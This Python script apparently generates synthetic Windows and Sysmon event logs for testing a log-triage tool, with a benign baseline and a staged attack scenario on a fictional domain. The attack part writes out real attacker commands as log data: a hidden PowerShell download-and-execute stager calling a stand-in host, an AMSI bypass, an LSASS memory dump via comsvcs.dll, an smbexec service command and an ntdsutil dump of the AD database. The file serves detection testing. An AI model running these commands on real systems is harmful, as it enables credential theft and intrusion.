#!/usr/bin/env python3
"""Generate the synthetic sample datasets in ``samples/``.

Everything here is fabricated for a fictional ``CORP`` domain (documentation IP ranges,
made-up hosts and users). Field names and values follow what Windows and Sysmon actually
log, so the samples exercise the same code paths as real evidence.

Output is deterministic: re-running the script produces byte-identical files.

    python scripts/make_samples.py            # writes samples/*.evtx|jsonl|csv
"""

from __future__ import annotations

import base64
import csv
import json
import sys
import zlib
from datetime import datetime, timedelta, timezone
from pathlib import Path
from typing import Dict, List

ROOT = Path(__file__).resolve().parents[1]
sys.path.insert(0, str(ROOT / "src"))

from evtx_triage.evtx import EvtxWriter, WriterEvent  # noqa: E402

SECURITY = ("Security", "Microsoft-Windows-Security-Auditing")
SYSTEM_SCM = ("System", "Service Control Manager")
SYSMON = ("Microsoft-Windows-Sysmon/Operational", "Microsoft-Windows-Sysmon")
POWERSHELL = ("Microsoft-Windows-PowerShell/Operational", "Microsoft-Windows-PowerShell")
EVENTLOG = ("Security", "Microsoft-Windows-Eventlog")

DOMAIN = "CORP"
DC, FS, SQL, WS1, WS2 = "DC01.corp.example", "FS01.corp.example", "SQL01.corp.example", \
    "WS01.corp.example", "WS02.corp.example"
IP = {DC: "192.0.2.10", FS: "192.0.2.20", SQL: "192.0.2.30", WS1: "192.0.2.101", WS2: "192.0.2.102"}
ATTACKER_IP = "198.51.100.66"
DAY = datetime(2026, 3, 14, tzinfo=timezone.utc)


def at(hh: int, mm: int, ss: int = 0, ms: int = 0) -> datetime:
    return DAY + timedelta(hours=hh, minutes=mm, seconds=ss, milliseconds=ms)


def sid(rid: int) -> str:
    return f"S-1-5-21-3623811015-3361044348-30300820-{rid}"


USERS = {"alice": 1104, "bob": 1105, "carol": 1106, "dave": 1107, "erin": 1108, "frank": 1109,
         "grace": 1110, "heidi": 1111, "adm.jsmith": 1120, "svc_sql": 1201, "svc_web": 1202,
         "svc_backup": 1203, "legacy_app": 1204}


def ev(eid: int, ts: datetime, host: str, log, data: Dict[str, str], user_data: str = None) -> WriterEvent:
    channel, provider = log
    return WriterEvent(eid, ts, host, channel, provider, {k: str(v) for k, v in data.items()}, user_data)


# --- Event builders (field order mirrors the real Windows manifests) -------------------
def logon_4624(ts, host, user, logon_type, *, ip="-", workstation="-", package="Kerberos",
               process="Kerberos", key_length=0, subject="-", outbound=None):
    d = {
        "SubjectUserSid": sid(USERS[subject]) if subject in USERS else "S-1-0-0",
        "SubjectUserName": subject, "SubjectDomainName": DOMAIN if subject != "-" else "-",
        "SubjectLogonId": "0x0" if subject == "-" else "0x18a7875",
        "TargetUserSid": sid(USERS.get(user, 500)), "TargetUserName": user, "TargetDomainName": DOMAIN,
        "TargetLogonId": f"0x{zlib.crc32(f'{ts}{host}{user}'.encode()) % 0xFFFFFF:x}",
        "LogonType": logon_type, "LogonProcessName": process, "AuthenticationPackageName": package,
        "WorkstationName": workstation, "LogonGuid": "{00000000-0000-0000-0000-000000000000}",
        "TransmittedServices": "-", "LmPackageName": "NTLM V2" if package == "NTLM" else "-",
        "KeyLength": key_length, "ProcessId": "0x0" if logon_type == "3" else "0x3ec",
        "ProcessName": "-" if logon_type == "3" else "C:\\Windows\\System32\\svchost.exe",
        "IpAddress": ip, "IpPort": "0" if ip == "-" else "49712",
        "ImpersonationLevel": "%%1833", "RestrictedAdminMode": "-",
        "TargetOutboundUserName": outbound or "-", "TargetOutboundDomainName": DOMAIN if outbound else "-",
        "VirtualAccount": "%%1843", "TargetLinkedLogonId": "0x0", "ElevatedToken": "%%1843",
    }
    return ev(4624, ts, host, SECURITY, d)


def logon_fail_4625(ts, host, user, ip, workstation="ROGUE"):
    return ev(4625, ts, host, SECURITY, {
        "SubjectUserSid": "S-1-0-0", "SubjectUserName": "-", "SubjectDomainName": "-", "SubjectLogonId": "0x0",
        "TargetUserSid": "S-1-0-0", "TargetUserName": user, "TargetDomainName": DOMAIN,
        "Status": "0xc000006d", "FailureReason": "%%2313", "SubStatus": "0xc000006a",
        "LogonType": "3", "LogonProcessName": "NtLmSsp ", "AuthenticationPackageName": "NTLM",
        "WorkstationName": workstation, "TransmittedServices": "-", "LmPackageName": "-", "KeyLength": "0",
        "ProcessId": "0x0", "ProcessName": "-", "IpAddress": ip, "IpPort": "51234",
    })


def tgs_4769(ts, user, service, etype, ip):
    return ev(4769, ts, DC, SECURITY, {
        "TargetUserName": f"{user}@CORP.EXAMPLE", "TargetDomainName": "CORP.EXAMPLE", "ServiceName": service,
        "ServiceSid": sid(USERS.get(service, 1000)), "TicketOptions": "0x40810000",
        "TicketEncryptionType": etype, "IpAddress": f"::ffff:{ip}", "IpPort": "49800", "Status": "0x0",
        "LogonGuid": "{6A3E8A5C-1B2D-4C3E-9F10-2B3C4D5E6F70}", "TransmittedServices": "-",
    })


def tgt_4768(ts, user, ip, preauth="2", etype="0x12"):
    return ev(4768, ts, DC, SECURITY, {
        "TargetUserName": user, "TargetDomainName": "CORP", "TargetSid": sid(USERS[user]),
        "ServiceName": "krbtgt", "ServiceSid": sid(502), "TicketOptions": "0x40810010", "Status": "0x0",
        "TicketEncryptionType": etype, "PreAuthType": preauth, "IpAddress": f"::ffff:{ip}", "IpPort": "49801",
        "CertIssuerName": "", "CertSerialNumber": "", "CertThumbprint": "",
    })


def sysmon_proc(ts, host, image, cmd, user, parent="C:\\Windows\\explorer.exe", pid=4242):
    return ev(1, ts, host, SYSMON, {
        "RuleName": "-", "UtcTime": ts.strftime("%Y-%m-%d %H:%M:%S.%f")[:-3],
        "ProcessGuid": "{8B3A1C2D-0000-0000-0000-000000000000}", "ProcessId": pid, "Image": image,
        "FileVersion": "-", "Description": "-", "Product": "-", "Company": "-", "OriginalFileName": "-",
        "CommandLine": cmd, "CurrentDirectory": "C:\\Windows\\system32\\", "User": f"{DOMAIN}\\{user}",
        "LogonGuid": "{8B3A1C2D-0000-0000-0000-0020E4FF0000}", "LogonId": "0x1cd8f6",
        "TerminalSessionId": "1", "IntegrityLevel": "High",
        "Hashes": "SHA256=0000000000000000000000000000000000000000000000000000000000000000",
        "ParentProcessGuid": "{8B3A1C2D-0000-0000-0000-000000000001}", "ParentProcessId": "4100",
        "ParentImage": parent, "ParentCommandLine": parent, "ParentUser": f"{DOMAIN}\\{user}",
    })


def sysmon_access(ts, host, source_image, mask, user, trace):
    return ev(10, ts, host, SYSMON, {
        "RuleName": "-", "UtcTime": ts.strftime("%Y-%m-%d %H:%M:%S.%f")[:-3],
        "SourceProcessGUID": "{8B3A1C2D-0000-0000-0000-000000000002}", "SourceProcessId": "5120",
        "SourceThreadId": "5124", "SourceImage": source_image,
        "TargetProcessGUID": "{8B3A1C2D-0000-0000-0000-000000000003}", "TargetProcessId": "636",
        "TargetImage": "C:\\Windows\\system32\\lsass.exe", "GrantedAccess": mask, "CallTrace": trace,
        "SourceUser": user, "TargetUser": "NT AUTHORITY\\SYSTEM",
    })


def script_block(ts, host, text, user_rid):
    return ev(4104, ts, host, POWERSHELL, {
        "MessageNumber": "1", "MessageTotal": "1", "ScriptBlockText": text,
        "ScriptBlockId": "{2F4E6A8C-1B3D-4E5F-8A9B-0C1D2E3F4A5B}", "Path": "",
    })


def service_7045(ts, host, name, path, account="LocalSystem"):
    return ev(7045, ts, host, SYSTEM_SCM, {
        "ServiceName": name, "ImagePath": path, "ServiceType": "user mode service",
        "StartType": "demand start", "AccountName": account,
    })


def share_5145(ts, host, user, ip, share, target):
    return ev(5145, ts, host, SECURITY, {
        "SubjectUserSid": sid(USERS[user]), "SubjectUserName": user, "SubjectDomainName": DOMAIN,
        "SubjectLogonId": "0x4530f0f", "ObjectType": "File", "IpAddress": ip, "IpPort": "50211",
        "ShareName": share, "ShareLocalPath": "\\??\\C:\\Windows" if "ADMIN" in share else "",
        "RelativeTargetName": target, "AccessMask": "0x3", "AccessList": "%%1538 %%1541",
        "AccessReason": "-",
    })


def log_cleared(ts, host, user):
    return ev(1102, ts, host, EVENTLOG, {
        "SubjectUserSid": sid(USERS[user]), "SubjectUserName": user, "SubjectDomainName": DOMAIN,
        "SubjectLogonId": "0x4530f0f",
    }, user_data="LogFileCleared")


def encoded(command: str) -> str:
    return base64.b64encode(command.encode("utf-16-le")).decode()


# --- Datasets ------------------------------------------------------------------
def baseline() -> List[WriterEvent]:
    """A normal morning: logons, AES Kerberos, admin scripts, AV touching LSASS. Should be quiet."""
    out: List[WriterEvent] = []
    people = ["alice", "bob", "carol", "dave", "erin"]
    for i, user in enumerate(people):
        ws = WS1 if i % 2 == 0 else WS2
        t = at(7, 50 + i)
        out.append(tgt_4768(t, user, IP[ws]))
        out.append(logon_4624(t + timedelta(seconds=2), ws, user, "2", process="User32 ",
                              package="Negotiate", subject="-"))
        out.append(tgs_4769(t + timedelta(seconds=5), user, "FS01$", "0x12", IP[ws]))
        out.append(logon_4624(t + timedelta(seconds=6), FS, user, "3", ip=IP[ws]))
        out.append(sysmon_proc(t + timedelta(seconds=40), ws, "C:\\Program Files\\Microsoft Office\\root\\"
                               "Office16\\OUTLOOK.EXE", '"OUTLOOK.EXE"', user))
    # One user mistypes a password twice: not a spray.
    out.append(logon_fail_4625(at(8, 1), DC, "carol", IP[WS1], "WS01"))
    out.append(logon_fail_4625(at(8, 1, 9), DC, "carol", IP[WS1], "WS01"))
    # Backup service account touches two servers: below fan-out threshold.
    out.append(logon_4624(at(8, 5), FS, "svc_backup", "3", ip=IP[DC]))
    out.append(logon_4624(at(8, 6), SQL, "svc_backup", "3", ip=IP[DC]))
    # Admin housekeeping in PowerShell.
    out.append(script_block(at(8, 10), WS2, "Get-ChildItem C:\\Logs -Filter *.log | "
                            "Where-Object LastWriteTime -lt (Get-Date).AddDays(-30) | Remove-Item", 1105))
    out.append(sysmon_proc(at(8, 11), WS2, "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
                           "powershell.exe -NoProfile -File C:\\Scripts\\inventory.ps1", "bob"))
    # Defender reading LSASS is normal.
    out.append(sysmon_access(at(8, 12), WS1, "C:\\ProgramData\\Microsoft\\Windows Defender\\Platform\\"
                             "4.18.2302.7-0\\MsMpEng.exe", "0x1010", "NT AUTHORITY\\SYSTEM",
                             "C:\\Windows\\SYSTEM32\\ntdll.dll+9d4c4"))
    # A legitimate software update service.
    out.append(service_7045(at(8, 15), WS1, "Contoso Updater",
                            '"C:\\Program Files\\Contoso\\Updater\\updater.exe" /svc'))
    return out


def attack() -> List[WriterEvent]:
    """Spray -> Kerberoast -> PowerShell stager -> LSASS dump -> PtH -> PsExec/smbexec -> cover tracks."""
    out: List[WriterEvent] = []
    # 1. Password spray from a rogue host against the DC, one hit.
    for i, user in enumerate(["bob", "carol", "dave", "erin", "frank", "grace", "heidi", "svc_web", "alice"]):
        out.append(logon_fail_4625(at(9, 2, i * 7), DC, user, ATTACKER_IP))
    out.append(logon_4624(at(9, 3, 30), DC, "alice", "3", ip=ATTACKER_IP, workstation="ROGUE",
                          package="NTLM", process="NtLmSsp ", key_length=128))
    # 2. Kerberoasting with alice's credentials, plus AS-REP roast of a legacy account.
    out.append(tgt_4768(at(9, 10), "alice", ATTACKER_IP))
    for i, svc in enumerate(["svc_sql", "svc_web", "svc_backup"]):
        out.append(tgs_4769(at(9, 10, 4 + i), "alice", svc, "0x17", ATTACKER_IP))
    out.append(tgt_4768(at(9, 12), "legacy_app", ATTACKER_IP, preauth="0", etype="0x17"))
    # 3. Phishing-style stager on alice's workstation.
    stager = "IEX (New-Object Net.WebClient).DownloadString('http://198.51.100.66/a.ps1')"
    out.append(sysmon_proc(at(9, 20), WS1, "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
                           f"powershell.exe -nop -w hidden -enc {encoded(stager)}", "alice",
                           parent="C:\\Program Files\\Microsoft Office\\root\\Office16\\WINWORD.EXE"))
    out.append(script_block(at(9, 20, 2), WS1, stager, USERS["alice"]))
    out.append(script_block(at(9, 21), WS1,
                            "[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils')"
                            ".GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)", USERS["alice"]))
    # 4. LSASS dump via comsvcs.dll.
    out.append(sysmon_proc(at(9, 24), WS1, "C:\\Windows\\System32\\rundll32.exe",
                           "rundll32.exe C:\\Windows\\System32\\comsvcs.dll, MiniDump 636 "
                           "C:\\Users\\Public\\l.dmp full", "alice",
                           parent="C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe"))
    out.append(sysmon_access(at(9, 24, 1), WS1, "C:\\Windows\\System32\\rundll32.exe", "0x1fffff",
                             f"{DOMAIN}\\alice",
                             "C:\\Windows\\SYSTEM32\\ntdll.dll+9d4c4|C:\\Windows\\System32\\dbgcore.DLL+6dd6|"
                             "C:\\Windows\\System32\\comsvcs.dll+2c6d"))
    # 5. Pass-the-Hash with the admin's NTLM hash: source side, then target side on three servers.
    out.append(logon_4624(at(9, 30), WS1, "alice", "9", subject="alice", process="seclogo",
                          package="Negotiate", outbound="adm.jsmith", ip="::1"))
    for i, host in enumerate([FS, SQL, DC]):
        out.append(logon_4624(at(9, 31 + 2 * i), host, "adm.jsmith", "3", ip=IP[WS1], workstation="WS01",
                              package="NTLM", process="NtLmSsp ", key_length=0))
    # 6. Remote execution: PsExec on FS01, Impacket smbexec on DC01.
    out.append(share_5145(at(9, 31, 5), FS, "adm.jsmith", IP[WS1], "\\\\*\\ADMIN$", "PSEXESVC.exe"))
    out.append(share_5145(at(9, 31, 6), FS, "adm.jsmith", IP[WS1], "\\\\*\\IPC$", "svcctl"))
    out.append(service_7045(at(9, 31, 7), FS, "PSEXESVC", "%SystemRoot%\\PSEXESVC.exe"))
    out.append(service_7045(at(9, 35, 10), DC, "BTOBTO",
                            "%COMSPEC% /Q /c echo cd ^> \\\\127.0.0.1\\C$\\__output 2^>^&1 > "
                            "%TEMP%\\execute.bat & %COMSPEC% /Q /c %TEMP%\\execute.bat & del %TEMP%\\execute.bat"))
    # 7. Grab the AD database, then clear the Security log.
    out.append(sysmon_proc(at(9, 40), DC, "C:\\Windows\\System32\\ntdsutil.exe",
                           'ntdsutil.exe "ac i ntds" "ifm" "create full C:\\Windows\\Temp\\x" q q', "adm.jsmith",
                           parent="C:\\Windows\\System32\\cmd.exe"))
    out.append(log_cleared(at(9, 45), DC, "adm.jsmith"))
    return out


def to_flat(event: WriterEvent, record_id: int) -> Dict:
    return {
        "EventID": event.event_id, "TimeCreated": event.timestamp.strftime("%Y-%m-%dT%H:%M:%S.%fZ"),
        "Computer": event.computer, "Channel": event.channel, "Provider": event.provider,
        "EventRecordID": record_id, "EventData": event.data,
    }


def write_all(out_dir: Path) -> None:
    out_dir.mkdir(parents=True, exist_ok=True)
    quiet = sorted(baseline(), key=lambda e: e.timestamp)
    full = sorted(baseline() + attack(), key=lambda e: e.timestamp)

    for name, events in (("baseline_benign", quiet), ("attack_scenario", full)):
        writer = EvtxWriter()
        writer.extend(events)
        writer.save(out_dir / f"{name}.evtx")

    with (out_dir / "attack_scenario.jsonl").open("w", encoding="utf-8", newline="\n") as fh:
        for i, event in enumerate(full, 1):
            fh.write(json.dumps(to_flat(event, i)) + "\n")

    with (out_dir / "attack_scenario.csv").open("w", encoding="utf-8", newline="") as fh:
        w = csv.writer(fh, lineterminator="\n")
        w.writerow(["TimeCreated", "EventID", "Computer", "Channel", "Provider", "EventRecordID", "EventData"])
        for i, event in enumerate(full, 1):
            row = to_flat(event, i)
            w.writerow([row["TimeCreated"], row["EventID"], row["Computer"], row["Channel"], row["Provider"],
                        i, json.dumps(row["EventData"])])
    print(f"wrote {len(quiet)} baseline and {len(full)} scenario events to {out_dir}")


if __name__ == "__main__":
    write_all(Path(sys.argv[1]) if len(sys.argv) > 1 else ROOT / "samples")
